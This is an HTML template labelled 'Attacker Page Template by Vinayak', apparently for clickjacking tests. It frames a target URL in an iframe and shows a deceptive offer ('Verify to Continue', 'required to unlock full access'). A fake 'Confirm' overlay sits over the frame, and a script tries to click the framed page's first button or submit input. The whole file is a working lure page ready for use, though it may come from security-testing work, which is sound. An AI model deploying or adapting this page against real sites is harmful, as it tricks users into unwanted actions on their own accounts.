<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Embedded Offer Page</title>

    <style>
        body {
            margin: 0;
            padding: 0;
            background: #f9fafb;
            font-family: Arial, sans-serif;
            height: 100vh;
        }

        /* Attacker page layout */
        .page-wrapper {
            display: flex;
            flex-direction: column;
            height: 100%;
        }

        .header {
            padding: 20px 30px;
            background: #111827;
            color: #f9fafb;
            font-size: 20px;
            font-weight: bold;
        }

        .content {
            flex: 1;
            padding: 30px;
            display: flex;
            gap: 30px;
            align-items: flex-start;
        }

        .offer-box {
            width: 40%;
            background: white;
            padding: 24px;
            border-radius: 10px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
        }

        .offer-box h2 {
            margin-top: 0;
        }

        .offer-box p {
            color: #374151;
            line-height: 1.6;
        }

        .cta-button {
            margin-top: 20px;
            display: inline-block;
            padding: 14px 26px;
            background: #2563eb;
            color: white;
            border-radius: 8px;
            cursor: pointer;
            text-align: center;
            font-size: 16px;
        }

        /* Embedded iframe container */
        .iframe-wrapper {
            position: relative;
            width: 60%;
            height: 420px;
            border-radius: 12px;
            overflow: hidden;
            box-shadow: 0 10px 25px rgba(0,0,0,0.15);
            background: #e5e7eb;
        }

        iframe {
            width: 100%;
            height: 100%;
            border: 0;
        }

        /* Optional deceptive overlay button */
        .fake-overlay {
            position: absolute;
            bottom: 20px;
            right: 20px;
            padding: 12px 20px;
            background: rgba(37, 99, 235, 0.95);
            color: white;
            border-radius: 8px;
            font-size: 14px;
            cursor: pointer;
            z-index: 9999;
        }
    </style>
</head>
<body>

<div class="page-wrapper">
    <div class="header">
        Attacker Page Template by Vinayak
    </div>

    <div class="content">
        <!-- Attacker-visible content -->
        <div class="offer-box">
            <h2>Verify to Continue</h2>
            <p>
                To proceed with this exclusive partner feature, please review the
                information shown on the right and confirm your action.
            </p>
            <p>
                This step is required to unlock full access.
            </p>

            <div class="cta-button">
                Continue
            </div>
        </div>

        <!-- Small embedded target frame -->
        <div class="iframe-wrapper">
            <iframe id="targetFrame" src="{{ target_url }}"></iframe>

            <!-- Deceptive overlay -->
            <div class="fake-overlay" id="fakeBtn">
                Confirm
            </div>
        </div>
    </div>
</div>

<script>
    document.getElementById("fakeBtn").addEventListener("click", function () {
        const iframe = document.getElementById("targetFrame");
        try {
            const iframeDoc = iframe.contentWindow.document;
            const buttons = iframeDoc.querySelectorAll("button, input[type=submit]");
            if (buttons.length > 0) {
                buttons[0].click();
            }
        } catch (e) {
            // Cross-origin protection expected
        }
    });
</script>

</body>
</html>
